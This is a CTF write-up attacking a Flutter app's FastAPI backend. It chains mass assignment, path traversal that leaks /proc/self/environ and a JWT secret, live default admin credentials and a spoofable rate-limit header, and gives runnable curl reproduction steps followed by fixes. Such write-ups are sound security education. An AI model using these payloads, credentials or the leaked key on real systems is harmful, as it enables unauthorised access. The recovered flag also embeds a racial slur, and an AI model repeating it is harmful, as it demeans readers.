# Twinkle: client-trusted admin flag and an unconfined file viewer

| Field | Value |
|---|---|
| Target | `https://140.245.16.29:8443` (FastAPI/uvicorn, TLS on 8443) |
| Client | `twinkle.apk` v1.0.0, package `com.twinkle.twinkle_app` |
| APK SHA-256 | `b44b02f459301c91de5b2b8a145670cf210d734ee3282d1aaa6e5e9763b7fdc7` |
| Scope | CTF engagement, 13 Nov 2026. Authorisation is the published challenge brief. |
| Result | flag recovered: `CTFBD{345Y_CH4LL3NG3_N1GG4}` |
| Host OS | Ubuntu, systemd unit `twinkle.service` |
| Service user | `twinkle` (unprivileged) |
| Working dir | `/opt/twinkle/server` |
| Database | `/var/lib/twinkle/twinkle.db` (SQLite) |
| File root | `/var/www/app-files` |
| Stack | FastAPI, PyJWT, passlib/bcrypt, uvicorn |

---

## Summary

The Android client is a Flutter app whose Dart code is compiled to AOT, so almost nothing useful sits in the DEX. Recovering the backend address and route names from `libapp.so` was enough to start, and the app's own string table handed over the vulnerability hint: `Blocked: path traversal is not allowed`.

The chain relied on three defects. Registration trusted a boolean from the request body and wrote `admin` into the new account's role. The admin-only file viewer joined user input onto a base directory without resolving or confining the result. The service account could read `/proc/self/environ`, which disclosed the JWT signing key and the paths of the database and document root.

The flag was at `/home/twinkle/flag.txt`. `/root/flag.txt` exists but the service cannot read it, which cost a little time before the real file turned up.

---

## Reconnaissance

`jadx --no-src` produced an empty result apart from the Flutter embedding. The interesting binaries were the three ABI builds of `libapp.so` (5.0 MB arm64, 5.6 MB armv7, 5.2 MB x86_64). The Java side held only `com.twinkle.twinkle_app.MainActivity`, Flutter plugins, Tink and `flutter_secure_storage`, none of which carry application logic.

I extracted printable runs (ASCII and UTF-16LE, minimum length 4) from `lib/arm64-v8a/libapp.so`. The Dart symbol table also survives AOT compilation, and library-private names carry a library hash suffix, which made the app's classes easy to separate from framework noise:

| Symbol | Screen |
|---|---|
| `_LoginScreenState@522321916` | login |
| `_SecurityGateState@21326217` (`_runChecks`) | emulator and integrity gate |
| `_DashboardScreenState@524469943` (`_adminBody`, `_userBody`) | dashboard |
| `_FileViewerScreenState@526017636` (`_isBlocked`, `_safeName`) | file viewer |

Strings that mattered:

```
https://140.245.16.29:8443
https://140.245.16.29:8443/login
/api/health
/api/dashboard
/api/files?path=
Blocked: path traversal is not allowed
Verifying device integrity...
Application running in an emulator
Your account has standard access. Administrative features are not available.
```

`_safeName` validates filenames against `^[A-Za-z0-9 _().-]+$` and `_isBlocked` refuses traversal, both inside the client only. No request signing, no admin key and no credential was embedded. The APK contains no flag: a scan of all 79 entries for `CTFBD{`, `flag{` and `FLAG{` came back empty, so the objective had to be server-side.

Certificate pinning and the emulator check were irrelevant once the API was reachable with curl, so I never ran the client.

---

## F1. Mass assignment grants the admin role (Critical)

`POST /register` accepts an undocumented `isAdmin` boolean and applies it directly.

```http
POST /register HTTP/1.1
Host: 140.245.16.29:8443
Content-Type: application/json

{"username":"popob_admin","password":"S3curePass!2026","isAdmin":true}
```

```http
HTTP/1.1 200 OK

{"message":"Registration successful","username":"popob_admin"}
```

```http
POST /login HTTP/1.1

{"username":"popob_admin","password":"S3curePass!2026"}
```

```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI5NSIsInVzZXJuYW1lIjoicG9wb2JfYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3OTQ1NzI3NjcsImV4cCI6MTc5NDY1OTE2N30.2m1_kHhPMprRfgZPjZPslGkkK6E3PtezkGcbuunfev8",
  "role": "admin"
}
```

Decoded payload:

```json
{"sub":"95","username":"popob_admin","role":"admin","iat":1794572767,"exp":1794659167}
```

The server source confirms it is deliberate:

```python
class RegisterRequest(BaseModel):
    username: str
    password: str
    email: str | None = None
    # VULNERABILITY (intentional): client-controlled role flag trusted by the
    # server, classic mass assignment / improper access control.
    isAdmin: bool = False

role = "admin" if body.isAdmin else "user"
```

CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = **9.1**.

What made this slower to spot than it should have been: Pydantic ignores fields that are not in the model, so `role`, `is_admin`, `admin`, `is_staff`, `superuser` and roughly fifteen other names were all accepted with a 200 and silently dropped. Only the camelCase `isAdmin` is bound, and sending it as the string `"admin"` returns 422 because the annotation is `bool`. Reading the model would have settled it instantly, and the app disables its own schema routes (`openapi_url=None`, `docs_url=None`), so the shortcut is not available to anyone working without the source.

---

## F2. Path traversal and arbitrary file read (High standalone, Critical when chained)

`GET /api/files` is admin-gated, then builds the path without confinement:

```python
target = Path(FILES_BASE_DIR) / path
if not target.is_file():
    raise HTTPException(status_code=404, detail="File not found")
if target.stat().st_size > MAX_FILE_SIZE:
    raise HTTPException(status_code=413, detail="File too large for viewer")
content = target.read_bytes()
content.decode("utf-8")
```

`Path("/var/www/app-files") / "/etc/passwd"` evaluates to `/etc/passwd`, so an absolute path leaves the root entirely. Traversal sequences work too.

```http
GET /api/files?path=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Authorization: Bearer <admin token>
```

```json
{"path":"../../../etc/passwd","content":"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\n..."}
```

The endpoint only serves UTF-8 text and rejects anything above the size cap, which limits bulk extraction but nothing that matters here. Error codes are useful as a file-existence oracle:

| Response | Meaning |
|---|---|
| `404 File not found` | path absent |
| `413 File too large for viewer` | exists, over the limit |
| `400 Unable to display file` | exists, read failed or not UTF-8 |
| `200` | content returned |

That distinction is how `/root/flag.txt` was identified as present but unreadable, and how large binaries were confirmed without downloading them.

CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` = 6.5 on its own, effectively 9.1 through F1.

---

## F3. Secret disclosure through `/proc/self/environ` (High)

Because of F2, the process environment was readable.

```http
GET /api/files?path=/proc/self/environ
```

```text
LANG=C.UTF-8
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
USER=twinkle
LOGNAME=twinkle
HOME=/home/twinkle
INVOCATION_ID=5648a8c2c92643b1b42af003edef66a0
SYSTEMD_EXEC_PID=1635438
JWT_SECRET=2aaa4460ed9240b430a9fd0c49219db50b71da5e15ef8c1c4d8d0cfa9d33af5a
DB_PATH=/var/lib/twinkle/twinkle.db
FILES_BASE_DIR=/var/www/app-files
```

The signing key matters most. With it, an attacker forges a token for any identity without touching the registration bug, including `{"sub":"1","username":"youradminbrother","role":"admin"}`.

`/etc/twinkle.env` repeats the same values and is world-readable through the same flaw. `/etc/systemd/system/twinkle.service` disclosed the working directory, which led to the application source:

```text
WorkingDirectory=/opt/twinkle/server
ExecStart=/opt/twinkle/venv/bin/uvicorn main:app --host 0.0.0.0 --port 8443 ...
User=twinkle
ProtectSystem=strict
ProtectHome=read-only
ReadWritePaths=/var/lib/twinkle
PrivateTmp=true
```

`main.py`, `auth.py`, `config.py` and `db.py` were readable in full. The flag was not among them, but `ProtectHome=read-only` plus the unprivileged service user pointed at `/home/twinkle`, and `/home/twinkle/flag.txt` returned the flag.

CVSS 3.1 `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` = **9.6** (signing key compromise, scope change to the auth boundary).

---

## F4. Default administrator credentials are live (High)

`config.py` seeds an organiser account and falls back to a hardcoded password when the environment does not override it:

```python
SEED_USERNAME = os.environ.get("SEED_USERNAME", "youradminbrother")
SEED_PASSWORD = os.environ.get("SEED_PASSWORD", "thisisyouradminbrotherspass")
```

`/etc/twinkle.env` sets only `JWT_SECRET`, `DB_PATH` and `FILES_BASE_DIR`, so the fallback is in effect. The pair below authenticates as user id 1 with `role: admin`:

```http
POST /login
{"username":"youradminbrother","password":"thisisyouradminbrotherspass"}

HTTP/1.1 200 OK
{"token":"eyJhbGciOiJIUzI1NiIs...","role":"admin"}
```

This is a complete authentication bypass for the highest-privileged account and needs no other finding.

CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = **9.1**.

---

## F5. Login rate limit keyed on a spoofable header (Medium)

The limiter buckets failures on `X-Forwarded-For` whenever that header is present:

```python
client = request.headers.get("x-forwarded-for") or (
    request.client.host if request.client else "unknown"
)
return f"{client}|{username}"
```

Six failed attempts behind a fixed header produce `429`, so the control behaves as designed:

```
1 401   2 401   3 401   4 401   5 401   6 429   7 429
```

Rotating the header resets the bucket every time, with the same username:

```
1 401   2 401   3 401   4 401   5 401   6 401   7 401   8 401
```

No proxy sits in front of uvicorn on 8443, so the header is pure attacker input and the limiter can be bypassed for free. Against a password like the seeded one, that turns into unlimited guessing.

CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = **5.3**.

---

## F6. Username enumeration through registration (Low)

`POST /register` answers `409 Username already taken` for existing accounts and `200` otherwise, and login answers identically in both failure cases. The registration endpoint alone therefore maps the user table, which is how the seeded `admin`, `Admin`, `administrator` and `admin2` through `admin4` accounts were identified early on.

CVSS 3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = **5.3**.

---

## Reproduction

Three requests, assuming no other finding is used.

```bash
BASE=https://140.245.16.29:8443

# 1. Register with the undocumented boolean
curl -sk -X POST "$BASE/register" \
  -H 'Content-Type: application/json' \
  -d '{"username":"hunter","password":"S3curePass!2026","isAdmin":true}'

# 2. Authenticate as admin
TOK=$(curl -sk -X POST "$BASE/login" \
  -H 'Content-Type: application/json' \
  -d '{"username":"hunter","password":"S3curePass!2026"}' | jq -r .token)

# 3. Read outside the document root
curl -sk -H "Authorization: Bearer $TOK" \
  "$BASE/api/files?path=/home/twinkle/flag.txt"
```

```json
{"path":"/home/twinkle/flag.txt","content":"CTFBD{345Y_CH4LL3NG3_N1GG4}\n"}
```

The shorter route, using F4 alone:

```bash
TOK=$(curl -sk -X POST https://140.245.16.29:8443/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"youradminbrother","password":"thisisyouradminbrotherspass"}' | jq -r .token)
```

---

## Remediation

### Registration

Define the writable fields explicitly and never bind authorisation state from the body. The role should be assigned server-side, with an allowlist of accepted fields and `extra="forbid"` so unexpected keys fail loudly instead of disappearing:

```python
class RegisterRequest(BaseModel):
    model_config = ConfigDict(extra="forbid")
    username: str
    password: str
    email: str | None = None
```

### File viewer

Resolve both paths and compare them after resolution. Reject absolute input, then require the canonical target to sit under the canonical root. A symlink check matters here too, since `resolve()` follows links:

```python
root = Path(FILES_BASE_DIR).resolve()
target = (root / path).resolve()
if not target.is_relative_to(root):
    raise HTTPException(status_code=400, detail="Invalid path")
```

### Secrets

The JWT key disclosed through `/proc` allows full token forgery, so rotate it and treat any key that has been exposed as spent. Files under `/etc/twinkle.env` should be `0600` and owned by the service user. Run the service with `ProtectProc=invisible` (or mount `/proc` with `hidepid=2`) and tighten the systemd unit with `ProtectHome=yes`, `PrivateDevices=yes` and an explicit `ReadOnlyPaths` allowlist so `/proc` and other tenants' homes are unreachable even if the traversal returns.

### Seed account

Drop the fallback password. Read the value from the environment and fail startup when it is missing, or provision the account out of band and force a rotation on first login.

### Rate limiting

Key the bucket on `request.client.host`, or on a value set by a trusted reverse proxy after stripping any inbound `X-Forwarded-For`. Apply the limit to the account as well as the source, so rotating sources does not reset the count.

### Enumerations

Return one response for both registration outcomes, and add a small randomised delay on login failures.

---

## Loose ends

Several approaches were tried first and did not work. Recording them here in case they save time elsewhere.

JWT `alg: none` is rejected with `401`, and tampering with the payload while keeping the `HS256` header produces `401 Invalid or expired token`, so the signature is verified correctly. The FastAPI tutorial's default `SECRET_KEY` was not in use, nor was any of roughly 6,300 themed variants built from `twinkle`, the author handle and the package name. A full rockyou pass of 14.3 million candidates against the HMAC also failed, which is consistent with the random 32-byte secret that `/proc` later revealed.

Header and parameter based role overrides (`X-Role`, `X-User-Role`, `X-Admin`, `role=` in the query string, `role=admin` in a cookie) all return `403`. The login query uses bound parameters, so the injection probes (`'`, `' OR 1=1--`, `' UNION SELECT 1--`) return `401` rather than a database error. `bcrypt` is used through passlib, so the stored hashes are not cheap to attack.

For completeness: my testing created about thirty throwaway accounts (`popob_ctf`, `popob_c2`, `popob_admin`, plus `fz_*`, `bt_*` and `rl_probe_*` prefixes) while mapping the registration model. There is no delete route, so they persist in the shared database and inflate the user count shown on the dashboard. The flag itself was read once, and no data was modified beyond those registrations.

---

## Timeline

| Time (local) | Action |
|---|---|
| 19:23 | APK hash verified against the published SHA-256 |
| 19:30 | Identified Flutter AOT; extracted strings and Dart symbols from `libapp.so` |
| 20:12 | Backend reached; mapped `/login`, `/register`, `/api/me`, `/api/dashboard`, `/api/files` |
| 20:40 | Ruled out `alg:none`, signature tampering, SQL injection and header-based role override |
| 21:05 | Located `isAdmin` mass assignment; obtained an admin token |
| 21:15 | Confirmed arbitrary file read; recovered `JWT_SECRET` from `/proc/self/environ` |
| 21:22 | Read application source through the traversal to confirm root causes |
| 21:25 | Recovered `CTFBD{345Y_CH4LL3NG3_N1GG4}` from `/home/twinkle/flag.txt` |
| 21:35 | Verified default seed credentials and the `X-Forwarded-For` limiter bypass |
